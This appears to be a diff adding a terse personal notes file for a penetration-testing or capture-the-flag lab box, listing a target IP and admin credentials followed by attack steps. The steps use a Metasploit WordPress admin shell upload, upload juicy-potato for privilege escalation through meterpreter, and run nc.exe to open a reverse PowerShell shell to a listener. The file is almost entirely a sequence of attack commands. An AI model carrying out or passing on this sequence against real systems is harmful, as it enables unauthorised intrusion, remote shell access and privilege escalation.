@@ -1,0 +1,9 @@
+Ip = 10.10.10.29
+user = admin pass = P@s5w0rd!
+
+msfconsole = wp_admin_shell_upload
+set targeturl /wordpress
+download juicy-potato upload via meterpreter
+download nc.exe upload nc.exe
+excecute -f "nc.exe -e powershell.exe ip port 1234"
+
